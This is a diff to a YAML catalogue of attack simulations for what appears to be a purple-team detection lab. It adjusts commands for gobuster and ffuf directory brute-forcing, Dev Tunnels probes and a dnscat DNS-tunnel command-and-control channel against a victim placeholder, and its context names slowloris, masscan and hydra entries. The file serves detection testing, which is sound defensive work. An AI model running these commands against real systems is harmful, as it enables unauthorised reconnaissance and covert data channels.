@@ -90,7 +90,7 @@ attacks:
     timeout: 15
     command: |
       curl -sS --max-time 5 "https://global.rel.tunnels.api.visualstudio.com/api/v1/tunnels" -o /dev/null 2>&1 || true
-      curl -sS --max-time 5 "https://devtunnels.ms/" -o /dev/null 2>&1 || true
+      curl -sS --max-time 5 "https://www.devtunnels.ms/" -o /dev/null 2>&1 || true
       echo "Dev Tunnels SNI handshakes sent"
 
   - name: art-vscode-tunnel
@@ -237,7 +237,7 @@ attacks:
     timeout: 45
     command: |
       timeout 30 gobuster dir -u "http://{{VICTIM_IP}}:8081" \
-        -w /usr/share/wordlists/dirb/common.txt -q -t 10 --no-color \
+        -w /usr/share/dirb/wordlists/common.txt -q -t 10 --no-color \
         --timeout 3s 2>&1 | tail -15 || true
 
   - name: art-masscan-syn-burst
@@ -368,7 +368,7 @@ attacks:
     timeout: 45
     command: |
       timeout 30 ffuf -u "http://{{VICTIM_IP}}:8081/FUZZ" \
-        -w /usr/share/wordlists/dirb/common.txt -t 40 -mc 200,301,302 \
+        -w /usr/share/dirb/wordlists/common.txt -t 40 -mc 200,301,302 \
         -s -noninteractive 2>&1 | tail -15 || true
 
   - name: art-slowhttptest-slowloris
@@ -415,8 +415,8 @@ attacks:
     expected_verdict: UNDETECTED
     timeout: 25
     command: |
-      timeout 15 dnscat --dns "server={{VICTIM_IP}},port=53" \
-        --secret=purple-lab-atomic purple-dnscat.example.com 2>&1 | head -15 || true
+      timeout 15 dnscat --dns "server={{VICTIM_IP}},port=53,domain=purple-dnscat.example.com" \
+        --secret=purple-lab-atomic 2>&1 | head -15 || true
 
   - name: art-hydra-ftp-brute
     mitre: T1110.001
